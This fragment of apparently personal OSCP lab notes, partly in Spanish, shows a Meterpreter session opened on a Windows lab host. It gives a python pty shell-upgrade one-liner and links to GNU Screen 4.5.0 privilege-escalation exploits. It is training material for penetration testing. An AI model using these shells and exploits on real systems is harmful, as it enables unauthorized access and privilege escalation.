...
[*] Meterpreter session 1 opened (192.168.45.152:4444 -> 192.168.45.152:34770) at 2025-08-09 11:20:16 -0300
sessions
...
===============
  ...
  --  ----  ----                     -----------               ----------
  1         meterpreter x64/windows  OSCP\celia.almeda @ MS02  192.168.45.152:4444 -> 192.168.45.152:34770 (192.168.45.152)
```

> Todo lo anterior con MSF no dio resultados, la maquina no esta hecha para escalar privilegios
...
* [https://ethicalhackinghubcom.wordpress.com/2023/07/26/gnu-screen-4-5-0-local-privilege-escalation/](Poc)

> hacemos un Upgrade del shell

* `python -c 'import pty; pty.spawn("/bin/bash")'`

> Encontramos un exploit con mejor estructura en github [https://github.com/YasserREED/screen-v4.5.0-priv-escalate](repo)
